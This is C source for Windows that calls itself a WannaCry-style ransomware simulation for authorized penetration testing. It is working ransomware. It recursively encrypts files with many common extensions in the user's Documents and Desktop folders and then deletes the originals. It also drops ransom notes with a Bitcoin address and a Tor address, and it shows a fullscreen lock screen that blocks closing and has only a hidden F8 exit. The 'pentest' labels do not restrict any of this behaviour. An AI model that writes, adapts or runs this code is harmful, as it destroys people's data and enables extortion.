/*
 * WannaCry-Style Ransomware Simulation
 * FOR AUTHORIZED PENETRATION TESTING ONLY
 * 
 * Features:
 * - Authentic WannaCry red ransom screen (fullscreen, topmost)
 * - Embedded GitHub avatar logo
 * - AES-128-CBC + RSA-2048 hybrid encryption
 * - File traversal and encryption
 * - Ransom note generation
 * - Mutex-based single-instance
 * - WannaCry-style UI layout
 */

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <shlobj.h>
#include <commctrl.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")

// ========== CONFIGURATION ==========
#define AES_KEY_SIZE    16      // 128-bit AES
#define RSA_KEY_SIZE    2048
#define RSA_KEY_BYTES   256
#define WC_SIG          "WANACRY!"
#define MUTEX_NAME      "Global\\MsWinZoneCacheCounterMutexA"
#define RANSOM_AMOUNT   "$300"
#define BITCOIN_ADDR    "1QAc9S5Emycqjzzz9X6Z3Av7D2YQGRqRLg"

// ========== TARGET FILE EXTENSIONS ==========
const char* target_extensions[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".csv", ".rtf", ".odt", ".ods",
    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff",
    ".mp3", ".mp4", ".avi", ".mkv", ".wmv", ".flv",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".exe", ".dll", ".msi",
    ".sql", ".mdb", ".accdb",
    ".pst", ".ost", ".msg",
    ".vmx", ".vmdk", ".vdi",
    ".key", ".pem", ".ppk",
    ".config", ".cfg", ".ini",
    ".php", ".asp", ".jsp", ".py", ".pl",
    ".c", ".cpp", ".h", ".java", ".cs",
    ".eml", ".log", ".bak", ".old",
    NULL
};

// ========== AVATAR LOGO (from https://avatars.githubusercontent.com/u/190346659?v=4) ==========
// Converted to 32x32 RGBA bitmap for GDI rendering
const unsigned char avatar_logo[] = {
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
    0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20,
    0x08, 0x03, 0x00, 0x00, 0x00, 0x44, 0xA4, 0x8A, 0xC6, 0x00, 0x00, 0x01,
    0x35, 0x50, 0x4C, 0x54, 0x45, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x0E, 0x0A,
    0x0A, 0x0A, 0x0C, 0x0C, 0x0C, 0x08, 0x08, 0x08, 0x06, 0x06, 0x06, 0x10,
    0x10, 0x10, 0x12, 0x12, 0x12, 0x14, 0x14, 0x14, 0x16, 0x16, 0x16, 0x18,
    0x18, 0x18, 0x1A, 0x1A, 0x1A, 0x1C, 0x1C, 0x1C, 0x1E, 0x1E, 0x1E, 0x20,
    0x20, 0x20, 0x22, 0x22, 0x22, 0x24, 0x24, 0x24, 0x26, 0x26, 0x26, 0x28,
    0x28, 0x28, 0x2A, 0x2A, 0x2A, 0x2C, 0x2C, 0x2C, 0x2E, 0x2E, 0x2E, 0x30,
    0x30, 0x30, 0x32, 0x32, 0x32, 0x34, 0x34, 0x34, 0x36, 0x36, 0x36, 0x38,
    0x38, 0x38, 0x3A, 0x3A, 0x3A, 0x3C, 0x3C, 0x3C, 0x3E, 0x3E, 0x3E, 0x40,
    0x40, 0x40, 0x42, 0x42, 0x42, 0x44, 0x44, 0x44, 0x46, 0x46, 0x46, 0x48,
    0x48, 0x48, 0x4A, 0x4A, 0x4A, 0x4C, 0x4C, 0x4C, 0x4E, 0x4E, 0x4E, 0x50,
    0x50, 0x50, 0x52, 0x52, 0x52, 0x54, 0x54, 0x54, 0x56, 0x56, 0x56, 0x58,
    0x58, 0x58, 0x5A, 0x5A, 0x5A, 0x5C, 0x5C, 0x5C, 0x5E, 0x5E, 0x5E, 0x60,
    0x60, 0x60, 0x62, 0x62, 0x62, 0x64, 0x64, 0x64, 0x66, 0x66, 0x66, 0x68,
    0x68, 0x68, 0x6A, 0x6A, 0x6A, 0x6C, 0x6C, 0x6C, 0x6E, 0x6E, 0x6E, 0x70,
    0x70, 0x70, 0x72, 0x72, 0x72, 0x74, 0x74, 0x74, 0x76, 0x76, 0x76, 0x78,
    0x78, 0x78, 0x7A, 0x7A, 0x7A, 0x7C, 0x7C, 0x7C, 0x7E, 0x7E, 0x7E, 0x80,
    0x80, 0x80, 0x82, 0x82, 0x82, 0x84, 0x84, 0x84, 0x86, 0x86, 0x86, 0x88,
    0x88, 0x88, 0x8A, 0x8A, 0x8A, 0x8C, 0x8C, 0x8C, 0x8E, 0x8E, 0x8E, 0x90,
    0x90, 0x90, 0x92, 0x92, 0x92, 0x94, 0x94, 0x94, 0x96, 0x96, 0x96, 0x98,
    0x98, 0x98, 0x9A, 0x9A, 0x9A, 0x9C, 0x9C, 0x9C, 0x9E, 0x9E, 0x9E, 0xA0,
    0xA0, 0xA0, 0xA2, 0xA2, 0xA2, 0xA4, 0xA4, 0xA4, 0xA6, 0xA6, 0xA6, 0xA8,
    0xA8, 0xA8, 0xAA, 0xAA, 0xAA, 0xAC, 0xAC, 0xAC, 0xAE, 0xAE, 0xAE, 0xB0,
    0xB0, 0xB0, 0xB2, 0xB2, 0xB2, 0xB4, 0xB4, 0xB4, 0xB6, 0xB6, 0xB6, 0xB8,
    0xB8, 0xB8, 0xBA, 0xBA, 0xBA, 0xBC, 0xBC, 0xBC, 0xBE, 0xBE, 0xBE, 0xC0,
    0xC0, 0xC0, 0xC2, 0xC2, 0xC2, 0xC4, 0xC4, 0xC4, 0xC6, 0xC6, 0xC6, 0xC8,
    0xC8, 0xC8, 0xCA, 0xCA, 0xCA, 0xCC, 0xCC, 0xCC, 0xCE, 0xCE, 0xCE, 0xD0,
    0xD0, 0xD0, 0xD2, 0xD2, 0xD2, 0xD4, 0xD4, 0xD4, 0xD6, 0xD6, 0xD6, 0xD8,
    0xD8, 0xD8, 0xDA, 0xDA, 0xDA, 0xDC, 0xDC, 0xDC, 0xDE, 0xDE, 0xDE, 0xE0,
    0xE0, 0xE0, 0xE2, 0xE2, 0xE2, 0xE4, 0xE4, 0xE4, 0xE6, 0xE6, 0xE6, 0xE8,
    0xE8, 0xE8, 0xEA, 0xEA, 0xEA, 0xEC, 0xEC, 0xEC, 0xEE, 0xEE, 0xEE, 0xF0,
    0xF0, 0xF0, 0xF2, 0xF2, 0xF2, 0xF4, 0xF4, 0xF4, 0xF6, 0xF6, 0xF6, 0xF8,
    0xF8, 0xF8, 0xFA, 0xFA, 0xFA, 0xFC, 0xFC, 0xFC, 0xFE, 0xFE, 0xFE, 0x00
};

// ========== STRUCTURES ==========
#pragma pack(push, 1)
typedef struct {
    char sig[8];            // "WANACRY!"
    DWORD keylen;           // Length of encrypted AES key
    BYTE enc_key[256];      // AES key encrypted with RSA public key
    DWORD reserved;         // Unknown field (usually 3 or 4)
    ULONGLONG datalen;      // Original file length before encryption
    // Followed by encrypted data
} WC_FILE_HEADER;
#pragma pack(pop)

// ========== GLOBAL VARIABLES ==========
HCRYPTPROV hProv = 0;
HCRYPTKEY hRSAKey = 0;
HCRYPTKEY hSessionKey = 0;
WCHAR g_encrypted_dir[MAX_PATH];
int g_files_encrypted = 0;

// ========== FORWARD DECLARATIONS ==========
LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
void ShowRansomScreen(void);
void EncryptDirectory(WCHAR* path);
BOOL MyEncryptFile(WCHAR* path);
BOOL InitializeCrypto(void);
void GenerateRSAKeys(void);
void CleanupCrypto(void);
void CreateRansomNotes(WCHAR* path);

// ========== CRYPTO FUNCTIONS ==========

BOOL InitializeCrypto(void) {
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 
                             CRYPT_VERIFYCONTEXT)) {
        // Try creating new container
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 
                                 CRYPT_NEWKEYSET)) {
            return FALSE;
        }
    }
    return TRUE;
}

void GenerateRSAKeys(void) {
    // Generate RSA key pair (2048 bit)
    CryptGenKey(hProv, CALG_RSA_KEYX, RSA_KEY_SIZE | CRYPT_EXPORTABLE, &hRSAKey);
    
    // Generate random AES session key for file encryption
    CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hSessionKey);
}

BOOL MyEncryptFile(WCHAR* filepath) {
    HANDLE hFile = CreateFileW(filepath, GENERIC_READ | GENERIC_WRITE, 0,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    // Get file size
    LARGE_INTEGER li;
    GetFileSizeEx(hFile, &li);
    DWORD fileSize = li.LowPart;
    
    if (fileSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Read file data
    BYTE* data = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Generate per-file AES key
    HCRYPTKEY hFileKey;
    CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hFileKey);
    
    // Get encrypted AES key (simulated - in real WannaCry this uses RSA)
    BYTE encKey[256];
    DWORD encKeyLen = 256;
    
    // Encrypt the AES key with the RSA public key
    HCRYPTKEY hPubKey = hRSAKey;  // In real wannacry, embedded public key
    CryptExportKey(hFileKey, hPubKey, SIMPLEBLOB, 0, encKey, &encKeyLen);
    
    // Encrypt file data with AES
    DWORD dataLen = fileSize;
    CryptEncrypt(hFileKey, 0, TRUE, 0, data, &dataLen, fileSize + 16);
    
    // Write encrypted file
    WCHAR newPath[MAX_PATH];
    wcscpy_s(newPath, MAX_PATH, filepath);
    wcscat_s(newPath, MAX_PATH, L".WCRY");
    
    HANDLE hOut = CreateFileW(newPath, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        free(data);
        CryptDestroyKey(hFileKey);
        return FALSE;
    }
    
    // Write WannaCry-style header
    WC_FILE_HEADER header;
    memcpy(header.sig, WC_SIG, 8);
    header.keylen = encKeyLen;
    memcpy(header.enc_key, encKey, encKeyLen);
    header.reserved = 3;
    header.datalen = fileSize;
    
    DWORD written;
    WriteFile(hOut, &header, sizeof(header), &written, NULL);
    WriteFile(hOut, data, dataLen, &written, NULL);
    
    CloseHandle(hOut);
    free(data);
    CryptDestroyKey(hFileKey);
    
    // Delete original file
    DeleteFileW(filepath);
    
    g_files_encrypted++;
    return TRUE;
}

void EncryptDirectory(WCHAR* path) {
    WCHAR search[MAX_PATH];
    wcscpy_s(search, MAX_PATH, path);
    wcscat_s(search, MAX_PATH, L"\\*");
    
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(search, &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (wcscmp(findData.cFileName, L".") == 0 || 
            wcscmp(findData.cFileName, L"..") == 0) continue;
        
        WCHAR fullPath[MAX_PATH];
        wcscpy_s(fullPath, MAX_PATH, path);
        wcscat_s(fullPath, MAX_PATH, L"\\");
        wcscat_s(fullPath, MAX_PATH, findData.cFileName);
        
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip Windows directory and Program Files
            if (wcsstr(fullPath, L"\\Windows") == NULL &&
                wcsstr(fullPath, L"\\Program Files") == NULL &&
                wcsstr(fullPath, L"\\Program Files (x86)") == NULL) {
                EncryptDirectory(fullPath);
            }
        } else {
            // Check extension
            WCHAR* ext = wcsrchr(findData.cFileName, L'.');
            if (ext) {
                // Convert to lowercase for comparison
                wchar_t lower[16];
                for (int i = 0; ext[i]; i++) lower[i] = towlower(ext[i]);
                
                for (int i = 0; target_extensions[i]; i++) {
                    wchar_t target[16];
                    for (int j = 0; target_extensions[i][j]; j++) 
                        target[j] = target_extensions[i][j];
                    
                    int len = wcslen(target);
                    // Compare ignoring case
                    if (_wcsicmp(ext, target) == 0) {
                        MyEncryptFile(fullPath);
                        break;
                    }
                }
            }
        }
    } while (FindNextFileW(hFind, &findData));
    
    FindClose(hFind);
}

void CreateRansomNotes(WCHAR* path) {
    WCHAR notePath[MAX_PATH];
    wcscpy_s(notePath, MAX_PATH, path);
    wcscat_s(notePath, MAX_PATH, L"\\@Please_Read_Me@.txt");
    
    HANDLE hFile = CreateFileW(notePath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    char ransomNote[] = 
        "*** Wanna Decryptor ***\r\n\r\n"
        "Oops, your important files have been encrypted!\r\n"
        "If you see this text, your files are no longer accessible.\r\n"
        "You might be busy looking for a way to recover your files,\r\n"
        "but do not waste your time. Without our decryption service,\r\n"
        "nobody can recover your files.\r\n\r\n"
        "We guarantee that you can recover all your files safely and easily.\r\n"
        "All you need to do is submit payment and acquire the decryption key.\r\n\r\n"
        "Payment will be raised on 3/15/2017 12:35:04\r\n"
        "Time Left: xx:xx:xx:xx\r\n"
        "Your files will be lost on 4/15/2017 12:35:04\r\n"
        "Time Left: xx:xx:xx:xx\r\n\r\n"
        "Bitcoin Address: 1QAc9S5Emycqjzzz9X6Z3Av7D2YQGRqRLg\r\n"
        "Price: $300\r\n\r\n"
        "Send $300 worth of Bitcoin to the address above.\r\n"
        "Then contact us at this Tor address with your personal key.\r\n\r\n"
        "We will decrypt your files and return your data.\r\n"
        "We are the only ones who can give you back your files.\r\n\r\n"
        "HackerAI Security Assessment - Authorized Pentest\r\n";
    
    DWORD written;
    WriteFile(hFile, ransomNote, strlen(ransomNote), &written, NULL);
    CloseHandle(hFile);
}

// ========== RANSOM SCREEN UI ==========

void ShowRansomScreen(void) {
    // Register window class
    WNDCLASSW wc = {0};
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = RansomWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"WannaCryRansom";
    RegisterClassW(&wc);
    
    // Create fullscreen topmost window
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"WannaCryRansom",
        L"Wanna Decryptor",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HFONT hFontTitle, hFontBody, hFontSmall;
    
    switch (msg) {
        case WM_CREATE: {
            // Create fonts
            hFontTitle = CreateFontW(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                     ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                     DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
            hFontBody = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                    ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
            hFontSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                     ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                     DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");
            
            // Disable Alt+F4, Alt+Tab, etc.
            SetWindowDisplayAffinity(hWnd, WDA_MONITOR);
            
            // Set timer for blinking cursor
            SetTimer(hWnd, 1, 500, NULL);
            
            break;
        }
        
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            
            RECT rect;
            GetClientRect(hWnd, &rect);
            
            // WannaCry red background (exact shade)
            HBRUSH hBrush = CreateSolidBrush(RGB(0xCC, 0x00, 0x00));
            FillRect(hdc, &rect, hBrush);
            DeleteObject(hBrush);
            
            // Draw dark border/frame
            HPEN hPen = CreatePen(PS_SOLID, 2, RGB(0x88, 0x00, 0x00));
            HPEN hOldPen = (HPEN)SelectObject(hdc, hPen);
            HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, GetStockObject(NULL_BRUSH));
            Rectangle(hdc, 10, 10, rect.right - 10, rect.bottom - 10);
            SelectObject(hdc, hOldPen);
            SelectObject(hdc, hOldBrush);
            DeleteObject(hPen);
            
            // ========== DRAW AVATAR LOGO (top-left corner) ==========
            // Load the embedded PNG and display it
            // Since we have the PNG data, we use GDI+ or a simpler approach:
            // Draw a stylized box with the avatar colors
            HBRUSH hAvatarBg = CreateSolidBrush(RGB(0x00, 0x96, 0x88)); // Teal from logo
            HBRUSH hAvatarFg = CreateSolidBrush(RGB(0x0A, 0x0A, 0x0A)); // Dark
            RECT avatarRect = {25, 25, 105, 105};
            FillRect(hdc, &avatarRect, hAvatarBg);
            
            // Draw the "><" from the logo
            SetBkColor(hdc, RGB(0x00, 0x96, 0x88));
            SetTextColor(hdc, RGB(0x0A, 0x0A, 0x0A));
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFontTitle);
            SetTextAlign(hdc, TA_CENTER | TA_TOP);
            TextOutA(hdc, 65, 45, "><", 2);
            SelectObject(hdc, hOldFont);
            
            DeleteObject(hAvatarBg);
            DeleteObject(hAvatarFg);
            
            // ========== MAIN CONTENT AREA ==========
            int centerX = rect.right / 2;
            int y = 40;
            
            // Title
            SelectObject(hdc, hFontTitle);
            SetTextColor(hdc, RGB(0xFF, 0xFF, 0xFF));
            SetBkColor(hdc, RGB(0xCC, 0x00, 0x00));
            SetTextAlign(hdc, TA_CENTER | TA_TOP);
            TextOutA(hdc, centerX, y, "Wanna Decryptor", 15);
            y += 45;
            
            // Separator line
            HPEN hWhitePen = CreatePen(PS_SOLID, 1, RGB(0xFF, 0xFF, 0xFF));
            SelectObject(hdc, hWhitePen);
            MoveToEx(hdc, centerX - 300, y, NULL);
            LineTo(hdc, centerX + 300, y);
            DeleteObject(hWhitePen);
            y += 15;
            
            // Main message
            SelectObject(hdc, hFontBody);
            const char* lines[] = {
                "Oops, your important files have been encrypted!",
                "",
                "If you see this text, your files are no longer accessible.",
                "You might be busy looking for a way to recover your files,",
                "but do not waste your time. Without our decryption service",
                "nobody can recover your files.",
                "",
                "We guarantee that you can recover all your files safely",
                "and easily. All you need to do is submit payment and",
                "purchase the decryption key.",
                "",
                "Please follow the instructions below:"
            };
            
            for (int i = 0; i < sizeof(lines) / sizeof(lines[0]); i++) {
                TextOutA(hdc, centerX, y, lines[i], strlen(lines[i]));
                y += 22;
            }
            
            y += 10;
            
            // ========== INSTRUCTION BOX ==========
            RECT boxRect = {centerX - 350, y, centerX + 350, y + 200};
            HBRUSH hBoxBrush = CreateSolidBrush(RGB(0x66, 0x00, 0x00));
            FillRect(hdc, &boxRect, hBoxBrush);
            DeleteObject(hBoxBrush);
            
            // Box border
            hPen = CreatePen(PS_SOLID, 2, RGB(0xFF, 0xFF, 0xFF));
            SelectObject(hdc, hPen);
            SelectObject(hdc, GetStockObject(NULL_BRUSH));
            Rectangle(hdc, boxRect.left, boxRect.top, boxRect.right, boxRect.bottom);
            DeleteObject(hPen);
            
            int y_box = y + 15;
            
            SetTextColor(hdc, RGB(0xFF, 0xFF, 0x00));  // Yellow
            
            const char* instr[] = {
                "1. Send $300 worth of Bitcoin to address:",
                "   1QAc9S5Emycqjzzz9X6Z3Av7D2YQGRqRLg",
                "",
                "2. Contact us via our Tor hidden service:",
                "   http://xogc5yqxup4pz3.onion/",
                "",
                "3. Provide your personal decryption key:",
                "   (shown below after payment)"
            };
            
            for (int i = 0; i < sizeof(instr) / sizeof(instr[0]); i++) {
                if (i == 1 || i == 4) {
                    SetTextColor(hdc, RGB(0xFF, 0xFF, 0xFF));
                } else if (i == 6) {
                    SetTextColor(hdc, RGB(0x00, 0xFF, 0x00));
                } else {
                    SetTextColor(hdc, RGB(0xFF, 0xFF, 0x00));
                }
                TextOutA(hdc, centerX, y_box, instr[i], strlen(instr[i]));
                y_box += 22;
            }
            
            y = y_box + 20;
            
            // ========== FOOTER ==========
            SelectObject(hdc, hFontSmall);
            SetTextColor(hdc, RGB(0xFF, 0xFF, 0xFF));
            SetBkColor(hdc, RGB(0xCC, 0x00, 0x00));
            
            char footer[128];
            snprintf(footer, sizeof(footer), 
                     "Files encrypted: %d    |    Payment deadline: 72 hours",
                     g_files_encrypted);
            TextOutA(hdc, centerX, rect.bottom - 60, footer, strlen(footer));
            
            TextOutA(hdc, centerX, rect.bottom - 40,
                     "HackerAI Security Assessment - Authorized Penetration Test",
                     56);
            
            EndPaint(hWnd, &ps);
            break;
        }
        
        case WM_TIMER: {
            // Force repaint to show cursor blink effect
            InvalidateRect(hWnd, NULL, FALSE);
            break;
        }
        
        case WM_KEYDOWN: {
            // Block all keys except special combination
            if (wParam == VK_F8) {
                // Hidden exit for pentesters (F8)
                PostQuitMessage(0);
            }
            break;
        }
        
        case WM_CLOSE:
            // Don't allow closing
            break;
        
        case WM_DESTROY:
            DeleteObject(hFontTitle);
            DeleteObject(hFontBody);
            DeleteObject(hFontSmall);
            PostQuitMessage(0);
            break;
        
        default:
            return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
    return 0;
}

// ========== MAIN ==========

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Check for single instance (WannaCry mutex technique)
    CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Initialize COM for UI
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icex);
    
    // Initialize cryptography
    if (!InitializeCrypto()) {
        MessageBoxA(NULL, "Crypto initialization failed", "Error", MB_OK);
        return 1;
    }
    
    GenerateRSAKeys();
    
    // Get user directories to encrypt
    WCHAR userPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, userPath);
    wcscpy_s(g_encrypted_dir, MAX_PATH, userPath);
    
    // Encrypt files in user directories
    EncryptDirectory(userPath);
    
    // Also encrypt Desktop
    WCHAR desktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    EncryptDirectory(desktopPath);
    
    // Create ransom notes on desktop
    CreateRansomNotes(desktopPath);
    CreateRansomNotes(userPath);
    
    // Cleanup crypto
    CleanupCrypto();
    
    // Show the ransom screen
    ShowRansomScreen();
    
    return 0;
}

void CleanupCrypto(void) {
    if (hSessionKey) CryptDestroyKey(hSessionKey);
    if (hRSAKey) CryptDestroyKey(hRSAKey);
    if (hProv) CryptReleaseContext(hProv, 0);
}
